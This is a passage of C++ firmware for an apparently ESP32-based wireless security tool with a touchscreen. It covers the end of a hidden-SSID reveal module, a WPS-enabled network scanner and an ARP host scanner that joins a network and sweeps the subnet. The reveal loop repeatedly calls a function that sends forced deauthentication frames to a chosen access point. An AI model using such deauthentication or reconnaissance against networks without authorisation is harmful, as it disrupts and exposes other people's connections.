  hopChannelsIfNeeded();
  updateStatusBar();
  runUI();
  maintainTouchNavBar();

  if (feature_exit_requested) {
    teardown();
    return;
  }

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  const bool onReveal = (s_selectedIndex >= 0 || s_listenAll);
  const uint32_t now = millis();

  if (onReveal && s_forcing && s_listening && s_selectedIndex >= 0 &&
      s_selectedIndex < s_count) {
    if (now - s_lastDeauthMs >= DEAUTH_INTERVAL_MS) {
      sendForceDeauth(s_aps[s_selectedIndex].bssid, s_aps[s_selectedIndex].channel);
      s_lastDeauthMs = now;
    }
  }

  if (onReveal && s_listening) {
    if (now - s_lastStatusMs > 500) {
      updateRevealStats();
      s_lastStatusMs = now;
    }
  }
}

}  // namespace HiddenSsidReveal


namespace WpsScanner {

#define SCREEN_WIDTH 240
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;
static constexpr int MAX_WPS_APS = 48;
static constexpr unsigned long BTN_DEBOUNCE_MS = 200;

struct WpsAp {
  char ssid[33];
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t channel;
  wifi_auth_mode_t authmode;
};

static WpsAp s_aps[MAX_WPS_APS];
static int s_count = 0;
static int s_currentIndex = 0;
static int s_currentPage = 0;
static bool s_scanning = false;
static bool s_uiDrawn = false;
static bool s_detailView = false;
static unsigned long s_lastBtnMs = 0;
static int s_lastRenderedIndex = -1;
static int s_lastRenderedPage = -1;

static void drawScanScreen(bool fullRedraw);
static void drawApDetail();
static void updateNavLabels();
static void runScan();

static int networksPerPage() {
  return max(1, (wifiListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H);
}

static void updateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (s_detailView) {
    setTouchNavLabels("Back", nullptr, nullptr, nullptr, "Scan");
  } else {
    setTouchNavLabels("Back", "Next", "View", "Prev", "Rescan");
  }
  redrawTouchButtonBar();
}

static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

static void drawTabBar(const char* leftButton, bool leftDisabled,
                       const char* prevButton, bool prevDisabled,
                       const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    updateNavLabels();
    return;
  }
  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton && leftButton[0]) {
    drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
  }
  if (prevButton && prevButton[0]) {
    drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  }
  if (nextButton && nextButton[0]) {
    drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
  }
}

static int compareWpsAp(const void* a, const void* b) {
  const WpsAp* ap1 = (const WpsAp*)a;
  const WpsAp* ap2 = (const WpsAp*)b;
  return (int)ap2->rssi - (int)ap1->rssi;
}

static const char* authShort(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA*";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "ENT";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA3*";
    default: return "?";
  }
}

static void truncCopy(char* dst, size_t dstSz, const char* src, size_t maxChars) {
  if (!dst || dstSz == 0) {
    return;
  }
  if (!src) {
    dst[0] = '\0';
    return;
  }
  size_t n = strlen(src);
  if (n > maxChars) {
    n = maxChars;
  }
  if (n >= dstSz) {
    n = dstSz - 1;
  }
  memcpy(dst, src, n);
  dst[n] = '\0';
}

static void drawApRow(int i, int y, bool isSel) {
  char buf[64];
  char name[16];
  if (s_aps[i].ssid[0]) {
    truncCopy(name, sizeof(name), s_aps[i].ssid, 11);
    if (strlen(s_aps[i].ssid) > 11) {
      strcat(name, "...");
    }
  } else {
    snprintf(name, sizeof(name), "(hidden)");
  }

  snprintf(buf, sizeof(buf), "%02d: %-14s %3d Ch%2d %s",
           i + 1, name, (int)s_aps[i].rssi, (int)s_aps[i].channel,
           authShort(s_aps[i].authmode));

  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
  tft.setCursor(2, y);
  tft.setTextColor(isSel ? ORANGE : FEATURE_BG);
  tft.print(isSel ? ">" : " ");
  tft.setCursor(10, y);
  tft.setTextColor(isSel ? ORANGE : WHITE);
  tft.println(buf);
}

static void displayScanning() {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  s_lastRenderedIndex = -1;
  s_lastRenderedPage = -1;
  tft.setTextSize(1);
  tft.setTextColor(GREEN);
  tft.setCursor(10, 50);
  tft.println("Scanning.");
  loading(100, ORANGE, 0, 0, 3, true);
  tft.setCursor(10, 65);
  tft.println("Looking for WPS APs.");
}

static void drawApDetail() {
  if (s_count <= 0) {
    s_detailView = false;
    drawScanScreen(true);
    return;
  }
  if (s_currentIndex < 0) s_currentIndex = 0;
  if (s_currentIndex >= s_count) s_currentIndex = s_count - 1;

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);

  const WpsAp& ap = s_aps[s_currentIndex];
  char buf[64];
  int y = 50;

  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setTextSize(1);

  tft.setCursor(10, y);
  tft.print("SSID: ");
  tft.print(ap.ssid[0] ? ap.ssid : "(hidden)");
  y += 20;

  tft.setCursor(10, y);
  snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
           ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5]);
  tft.print(buf);
  y += 20;

  tft.setCursor(10, y);
  snprintf(buf, sizeof(buf), "Channel: %d", (int)ap.channel);
  tft.print(buf);
  y += 20;

  tft.setCursor(10, y);
  snprintf(buf, sizeof(buf), "Signal: %d dBm", (int)ap.rssi);
  tft.print(buf);
  y += 20;

  tft.setCursor(10, y);
  tft.print("Security: ");
  tft.print(authShort(ap.authmode));
  y += 20;

  tft.setCursor(10, y);
  tft.print("WPS: Enabled");

  updateNavLabels();
}

static void drawScanScreen(bool fullRedraw) {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.setTextSize(1);

  if (s_scanning) {
    displayScanning();
    return;
  }

  if (s_count == 0) {
    wifiClearBody(TFT_BLACK);
    s_lastRenderedIndex = -1;
    s_lastRenderedPage = -1;
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    tft.println("No WPS networks found.");
    tft.setCursor(10, 65);
    tft.println("Press Rescan.");
    drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int perPage = networksPerPage();
  if (s_currentIndex < 0) {
    s_currentIndex = 0;
  }
  if (s_currentIndex >= s_count) {
    s_currentIndex = max(0, s_count - 1);
  }
  s_currentPage = s_currentIndex / max(1, perPage);

  const bool pageChanged = (s_currentPage != s_lastRenderedPage);
  const bool needFull = fullRedraw || pageChanged || (s_lastRenderedIndex < 0);

  if (!needFull && s_lastRenderedIndex != s_currentIndex) {
    const int prev = s_lastRenderedIndex;
    const int now = s_currentIndex;
    const int start = s_currentPage * perPage;
    if (prev >= start && prev < start + perPage) {
      drawApRow(prev, LIST_FIRST_ROW_Y + (prev - start) * LIST_ROW_H, false);
    }
    if (now >= start && now < start + perPage) {
      drawApRow(now, LIST_FIRST_ROW_Y + (now - start) * LIST_ROW_H, true);
    }
    s_lastRenderedIndex = s_currentIndex;
    return;
  }

  if (!needFull) {
    return;
  }

  wifiClearBody(TFT_BLACK);

  tft.setTextColor(GREEN);
  tft.setCursor(10, LIST_HEADER_Y);
  tft.println("WPS Networks:");

  char page_buf[20];
  snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
           s_currentPage + 1, max(1, (s_count + perPage - 1) / perPage));
  tft.setCursor(180, LIST_HEADER_Y);
  tft.setTextColor(GREEN);
  tft.println(page_buf);

  int y = LIST_FIRST_ROW_Y;
  const int start_index = s_currentPage * perPage;
  const int end_index = min(start_index + perPage, s_count);
  for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
    drawApRow(i, y, i == s_currentIndex);
    y += LIST_ROW_H;
  }

  drawTabBar("Rescan", false, "Prev", s_currentIndex <= 0, "Next",
             s_currentIndex >= s_count - 1);
  s_lastRenderedIndex = s_currentIndex;
  s_lastRenderedPage = s_currentPage;
}

static void runScan() {
  s_scanning = true;
  s_detailView = false;
  s_count = 0;
  s_currentIndex = 0;
  s_currentPage = 0;
  s_lastRenderedPage = -1;
  displayScanning();
  updateNavLabels();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(40);
  WiFi.scanDelete();

  const uint32_t dwell = wifiStaScanMsPerChannel();
  const int n = WiFi.scanNetworks(false, true, false, dwell);

  if (n > 0) {
    uint16_t apNum = (uint16_t)n;
    wifi_ap_record_t* rec =
        (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * apNum);
    if (rec) {
      if (esp_wifi_scan_get_ap_records(&apNum, rec) == ESP_OK) {
        for (uint16_t i = 0; i < apNum && s_count < MAX_WPS_APS; i++) {
          if (!rec[i].wps) {
            continue;
          }
          WpsAp& e = s_aps[s_count];
          truncCopy(e.ssid, sizeof(e.ssid), (const char*)rec[i].ssid, 32);
          memcpy(e.bssid, rec[i].bssid, 6);
          e.rssi = rec[i].rssi;
          e.channel = rec[i].primary;
          e.authmode = rec[i].authmode;
          s_count++;
        }
      }
      free(rec);
    }
  }

  if (s_count > 1) {
    qsort(s_aps, s_count, sizeof(WpsAp), compareWpsAp);
  }

  WiFi.scanDelete();
  s_scanning = false;
  s_lastRenderedPage = -1;
  drawScanScreen(true);
  updateNavLabels();
}

static void handleNavButtons() {
  const unsigned long now = millis();
  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    (void)isButtonPressedEdge(BTN_SELECT);
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    if (s_detailView) {
      s_detailView = false;
      drawScanScreen(true);
    } else {
      feature_exit_requested = true;
    }
    s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    runScan();
    s_lastBtnMs = now;
    return;
  }

  if (s_detailView) {
    // UP/DOWN/SELECT do nothing on the detail ("View") screen.
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    if (s_count > 0) {
      s_currentIndex = (s_currentIndex + 1) % s_count;
      drawScanScreen(false);
    }
    s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    if (s_count > 0) {
      s_currentIndex = (s_currentIndex - 1 + s_count) % s_count;
      drawScanScreen(false);
    }
    s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_SELECT)) {
    if (s_count > 0) {
      s_detailView = true;
      drawApDetail();
    }
    s_lastBtnMs = now;
    return;
  }
}

static void handleTouch() {
  int x, y;
  if (!feature_active || s_detailView || !readTouchXY(x, y)) {
    return;
  }

  const int perPage = networksPerPage();
  if (y >= LIST_FIRST_ROW_Y && y < wifiListBottomY() && s_count > 0) {
    const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
    const int idx = s_currentPage * perPage + row;
    if (row >= 0 && row < perPage && idx < s_count) {
      s_currentIndex = idx;
      s_detailView = true;
      drawApDetail();
      delay(120);
    }
  }
}

static void runUI() {
  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;
  static const unsigned char* icons[ICON_NUM] = {
      bitmap_icon_undo,
      bitmap_icon_go_back};

  if (!s_uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    s_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  switch (animationState) {
    case 0:
      break;
    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;
    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;
    case 3:
      if (activeIcon == 0) {
        runScan();
      }
      animationState = 0;
      activeIcon = -1;
      break;
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
              } else {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void teardown() {
  WiFi.scanDelete();
  WiFi.disconnect(true, true);
  s_scanning = false;
}

void wpsScannerSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  featureClearContent(TFT_BLACK);

  setupTouchscreen();
  s_uiDrawn = false;
  s_count = 0;
  s_currentIndex = 0;
  s_currentPage = 0;
  s_scanning = false;
  s_lastRenderedIndex = -1;
  s_lastRenderedPage = -1;

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();
  runUI();
  updateNavLabels();

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  runScan();
}

void wpsScannerLoop() {
  if (feature_exit_requested) {
    teardown();
    return;
  }

  handleNavButtons();
  handleTouch();
  updateStatusBar();
  runUI();
  maintainTouchNavBar();

  if (feature_exit_requested) {
    teardown();
  }
}

}  // namespace WpsScanner


namespace ArpScanner {

#define SCREEN_WIDTH 240
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;
static constexpr int MAX_APS = 40;
static constexpr int MAX_HOSTS = 64;
static constexpr unsigned long BTN_DEBOUNCE_MS = 200;
static constexpr uint32_t CONNECT_TIMEOUT_MS = 15000;
static constexpr int ARP_BATCH = 8;
static constexpr int ARP_BATCH_WAIT_MS = 80;
static constexpr int ARP_MAX_HOSTS_SWEEP = 254;

enum class Phase : uint8_t {
  ApList = 0,
  Hosts
};

struct ApEntry {
  char ssid[33];
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t channel;
  wifi_auth_mode_t authmode;
};

struct HostEntry {
  uint32_t ip;  // same packing as IPAddress uint32_t
  uint8_t mac[6];
};

static ApEntry s_aps[MAX_APS];
static int s_apCount = 0;
static HostEntry s_hosts[MAX_HOSTS];
static int s_hostCount = 0;

static Phase s_phase = Phase::ApList;
static int s_currentIndex = 0;
static int s_currentPage = 0;
static bool s_scanning = false;
static bool s_uiDrawn = false;
static unsigned long s_lastBtnMs = 0;
static int s_lastRenderedIndex = -1;
static int s_lastRenderedPage = -1;
static char s_joinedSsid[33] = {0};

static void drawScreen(bool fullRedraw);
static void updateNavLabels();
static void scanAccessPoints();
static void joinSelectedAp();
static void runArpSweep();
static void disconnectSta();

static int networksPerPage() {
  return max(1, (wifiListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H);
}

static void updateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (s_phase == Phase::ApList) {
    setTouchNavLabels("Back", "Next", "Join", "Prev", "Rescan");
  } else {
    setTouchNavLabels("Back", "Next", nullptr, "Prev", "Rescan");
  }
  redrawTouchButtonBar();
}

static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

static void drawTabBar(const char* leftButton, bool leftDisabled,
                       const char* prevButton, bool prevDisabled,
                       const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    updateNavLabels();
    return;
  }
  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton && leftButton[0]) {
    drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
  }
  if (prevButton && prevButton[0]) {
    drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  }
  if (nextButton && nextButton[0]) {
    drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
  }
}

static int compareApRssi(const void* a, const void* b) {
  const ApEntry* ap1 = (const ApEntry*)a;
  const ApEntry* ap2 = (const ApEntry*)b;
  return (int)ap2->rssi - (int)ap1->rssi;
}

static int compareHostIp(const void* a, const void* b) {
  const HostEntry* h1 = (const HostEntry*)a;
  const HostEntry* h2 = (const HostEntry*)b;
  if (h1->ip < h2->ip) return -1;
  if (h1->ip > h2->ip) return 1;
  return 0;
}

static const char* authShort(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA*";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "ENT";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA3*";
    default: return "?";
  }
}

static void truncCopy(char* dst, size_t dstSz, const char* src, size_t maxChars) {
  if (!dst || dstSz == 0) {
    return;
  }
  if (!src) {
    dst[0] = '\0';
    return;
  }
  size_t n = strlen(src);
  if (n > maxChars) {
    n = maxChars;
  }
  if (n >= dstSz) {
    n = dstSz - 1;
  }
  memcpy(dst, src, n);
  dst[n] = '\0';
}

static struct netif* staNetif() {
  if (netif_default && netif_is_up(netif_default) &&
      !ip4_addr_isany_val(*netif_ip4_addr(netif_default))) {
    return netif_default;
  }
  for (struct netif* n = netif_list; n != nullptr; n = n->next) {
    if (netif_is_up(n) && !ip4_addr_isany_val(*netif_ip4_addr(n))) {
      return n;
    }
  }
  return netif_default;
}

static void displayBusy(const char* line1, const char* line2) {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  s_lastRenderedIndex = -1;
  s_lastRenderedPage = -1;
  tft.setTextSize(1);
  tft.setTextColor(GREEN, TFT_BLACK);
  tft.setCursor(10, 50);
  tft.println(line1);
  if (line2 && line2[0]) {
    tft.setTextColor(GREEN, TFT_BLACK);
    tft.setCursor(10, 65);
    tft.println(line2);
  }
}

static void displayBusyWithLoading(const char* line1, const char* line2) {
  displayBusy(line1, line2);
  loading(100, ORANGE, 0, 0, 3, true);
  // Restore the status lines after the centered loading bitmap.
  tft.setTextSize(1);
  tft.setTextColor(GREEN, TFT_BLACK);
  tft.setCursor(10, 50);
  tft.println(line1);
  if (line2 && line2[0]) {
    tft.setCursor(10, 65);
    tft.println(line2);
  }
}

static constexpr int COL_LEFT_X = 10;
static constexpr int COL_RIGHT_MARGIN = 4;

static void drawApRow(int i, int y, bool isSel) {
  char name[16];
  if (s_aps[i].ssid[0]) {
    truncCopy(name, sizeof(name), s_aps[i].ssid, 11);
    if (strlen(s_aps[i].ssid) > 11) {
      strcat(name, "...");
    }
  } else {
    snprintf(name, sizeof(name), "(hidden)");
  }

  char left[28];
  snprintf(left, sizeof(left), "%02d: %s", i + 1, name);

  char right[28];
  snprintf(right, sizeof(right), "%d  Ch%u  %s",
           (int)s_aps[i].rssi, (unsigned)s_aps[i].channel,
           authShort(s_aps[i].authmode));

  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
  tft.setCursor(2, y);
  tft.setTextColor(isSel ? ORANGE : FEATURE_BG, TFT_BLACK);
  tft.print(isSel ? ">" : " ");

  const bool openNet = (s_aps[i].authmode == WIFI_AUTH_OPEN);
  const uint16_t fg = isSel ? ORANGE : (openNet ? ORANGE : WHITE);
  const int rightW = tft.textWidth(right);
  const int rightX = SCREEN_WIDTH - COL_RIGHT_MARGIN - rightW;

  tft.setTextColor(fg, TFT_BLACK);
  tft.setCursor(COL_LEFT_X, y);
  tft.print(left);

  tft.setCursor(rightX, y);
  tft.print(right);
}

static void drawHostRow(int i, int y, bool isSel) {
  char left[28];
  IPAddress ip(s_hosts[i].ip);
  snprintf(left, sizeof(left), "%02d: %d.%d.%d.%d",
           i + 1, ip[0], ip[1], ip[2], ip[3]);

  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           s_hosts[i].mac[0], s_hosts[i].mac[1], s_hosts[i].mac[2],
           s_hosts[i].mac[3], s_hosts[i].mac[4], s_hosts[i].mac[5]);

  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
  tft.setCursor(2, y);
  tft.setTextColor(isSel ? ORANGE : FEATURE_BG, TFT_BLACK);
  tft.print(isSel ? ">" : " ");

  const int macW = tft.textWidth(mac);
  const int macX = SCREEN_WIDTH - COL_RIGHT_MARGIN - macW;

  tft.setTextColor(isSel ? ORANGE : WHITE, TFT_BLACK);
  tft.setCursor(COL_LEFT_X, y);
  tft.print(left);

  tft.setTextColor(isSel ? ORANGE : UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(macX, y);
  tft.print(mac);
}

static void drawListCommon(bool fullRedraw, int count, const char* header,
                           void (*drawRow)(int, int, bool)) {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.setTextSize(1);

  if (s_scanning) {
    return;
  }

  if (count == 0) {
    wifiClearBody(TFT_BLACK);
    s_lastRenderedIndex = -1;
    s_lastRenderedPage = -1;
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    if (s_phase == Phase::ApList) {
      tft.println("No networks found.");
    } else {
      tft.println("No hosts found.");
    }
    tft.setCursor(10, 65);
    tft.println("Press Rescan.");
    drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int perPage = networksPerPage();
  if (s_currentIndex < 0) {
    s_currentIndex = 0;
  }
  if (s_currentIndex >= count) {
    s_currentIndex = max(0, count - 1);
  }
  s_currentPage = s_currentIndex / max(1, perPage);

  const bool pageChanged = (s_currentPage != s_lastRenderedPage);
  const bool needFull = fullRedraw || pageChanged || (s_lastRenderedIndex < 0);

  if (!needFull && s_lastRenderedIndex != s_currentIndex) {
    const int prev = s_lastRenderedIndex;
    const int now = s_currentIndex;
    const int start = s_currentPage * perPage;
    if (prev >= start && prev < start + perPage) {
      drawRow(prev, LIST_FIRST_ROW_Y + (prev - start) * LIST_ROW_H, false);
    }
    if (now >= start && now < start + perPage) {
      drawRow(now, LIST_FIRST_ROW_Y + (now - start) * LIST_ROW_H, true);
    }
    s_lastRenderedIndex = s_currentIndex;
    return;
  }

  if (!needFull) {
    return;
  }

  wifiClearBody(TFT_BLACK);

  tft.setTextColor(GREEN);
  tft.setCursor(10, LIST_HEADER_Y);
  tft.println(header);

  char page_buf[20];
  snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
           s_currentPage + 1, max(1, (count + perPage - 1) / perPage));
  tft.setCursor(180, LIST_HEADER_Y);
  tft.setTextColor(GREEN);
  tft.println(page_buf);

  int y = LIST_FIRST_ROW_Y;
  const int start_index = s_currentPage * perPage;
  const int end_index = min(start_index + perPage, count);
  for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
    drawRow(i, y, i == s_currentIndex);
    y += LIST_ROW_H;
  }

  drawTabBar("Rescan", false, "Prev", s_currentIndex <= 0, "Next",
             s_currentIndex >= count - 1);
  s_lastRenderedIndex = s_currentIndex;
  s_lastRenderedPage = s_currentPage;
}

static void drawScreen(bool fullRedraw) {
  if (s_phase == Phase::ApList) {
    drawListCommon(fullRedraw, s_apCount, "Join Network:", drawApRow);
  } else {
    drawListCommon(fullRedraw, s_hostCount, "ARP Hosts:", drawHostRow);
  }
  updateNavLabels();
}

static void scanAccessPoints() {
  s_scanning = true;
  s_phase = Phase::ApList;
  s_apCount = 0;
  s_currentIndex = 0;
  s_currentPage = 0;
  s_lastRenderedPage = -1;
  displayBusyWithLoading("Scanning.", "Looking for networks.");
  updateNavLabels();

  disconnectSta();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(40);
  WiFi.scanDelete();

  const uint32_t dwell = wifiStaScanMsPerChannel();
  const int n = WiFi.scanNetworks(false, true, false, dwell);
  if (n > 0) {
    for (int i = 0; i < n && s_apCount < MAX_APS; i++) {
      ApEntry& e = s_aps[s_apCount];
      truncCopy(e.ssid, sizeof(e.ssid), WiFi.SSID(i).c_str(), 32);
      const uint8_t* bssid = WiFi.BSSID(i);
      if (bssid) {
        memcpy(e.bssid, bssid, 6);
      } else {
        memset(e.bssid, 0, 6);
      }
      e.rssi = (int8_t)WiFi.RSSI(i);
      e.channel = (uint8_t)WiFi.channel(i);
      e.authmode = WiFi.encryptionType(i);
      s_apCount++;
    }
  }

  if (s_apCount > 1) {
    qsort(s_aps, s_apCount, sizeof(ApEntry), compareApRssi);
  }

  WiFi.scanDelete();
  s_scanning = false;
  s_lastRenderedPage = -1;
  drawScreen(true);
}

static bool promptPassword(String& outPass) {
  OnScreenKeyboardConfig cfg;
  cfg.titleLine1 = "[!] WiFi password";
  cfg.titleLine2 = "Required to join AP for ARP scan";
  osKeyboardUseStandardLayout(cfg);
  cfg.maxLen = 63;
  cfg.shuffleNames = nullptr;
  cfg.shuffleCount = 0;
  cfg.buttonsY = 195;
  cfg.backLabel = "Back";
  cfg.middleLabel = nullptr;
  cfg.okLabel = "Join";
  cfg.enableShuffle = false;
  cfg.requireNonEmpty = true;
  cfg.emptyErrorMsg = "Password required!";

  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, "");
  resetTouchNavHeldState();
  s_uiDrawn = false;

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();

  if (!r.accepted || r.text.length() == 0) {
    return false;
  }
  outPass = r.text;
  return true;
}

static bool connectToAp(const ApEntry& ap, const char* password) {
  displayBusyWithLoading("Connecting.", ap.ssid[0] ? ap.ssid : "(hidden)");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(40);

  if (ap.authmode == WIFI_AUTH_OPEN || !password || !password[0]) {
    WiFi.begin(ap.ssid, nullptr, ap.channel, ap.bssid, true);
  } else {
    WiFi.begin(ap.ssid, password, ap.channel, ap.bssid, true);
  }

  const uint32_t start = millis();
  while (WiFi.status() != WL_CONNECTED) {
    if (feature_exit_requested || isButtonPressed(BTN_SELECT) || featureExitButtonPressed()) {
      WiFi.disconnect(true, true);
      return false;
    }
    if (millis() - start > CONNECT_TIMEOUT_MS) {
      WiFi.disconnect(true, true);
      return false;
    }
    delay(50);
    updateStatusBar();
  }
  truncCopy(s_joinedSsid, sizeof(s_joinedSsid), ap.ssid, 32);
  return true;
}

static void disconnectSta() {
  if (WiFi.getMode() != WIFI_OFF) {
    WiFi.disconnect(true, true);
  }
  s_joinedSsid[0] = '\0';
}

static bool hostAlreadyStored(uint32_t ip) {
  for (int i = 0; i < s_hostCount; i++) {
    if (s_hosts[i].ip == ip) {
      return true;
    }
  }
  return false;
}

static void tryStoreHost(uint32_t ipU32, const uint8_t mac[6]) {
  if (s_hostCount >= MAX_HOSTS || hostAlreadyStored(ipU32)) {
    return;
  }
  HostEntry& h = s_hosts[s_hostCount];
  h.ip = ipU32;
  memcpy(h.mac, mac, 6);
  s_hostCount++;
}

static void runArpSweep() {
  s_scanning = true;
  s_phase = Phase::Hosts;
  s_hostCount = 0;
  s_currentIndex = 0;
  s_currentPage = 0;
  s_lastRenderedPage = -1;

  if (WiFi.status() != WL_CONNECTED) {
    s_scanning = false;
    displayBusy("Not connected.", "Join a network first.");
    delay(700);
    s_phase = Phase::ApList;
    drawScreen(true);
    return;
  }

  displayBusy("ARP Scanning.", "Probing local subnet.");
  updateNavLabels();

  // Stable progress line under the status text (no wipe / no status-bar churn).
  int lastProgHosts = -1;
  auto paintHostProgress = [&]() {
    if (s_hostCount == lastProgHosts) {
      return;
    }
    lastProgHosts = s_hostCount;
    char prog[32];
    snprintf(prog, sizeof(prog), "Found %-3d hosts   ", s_hostCount);
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
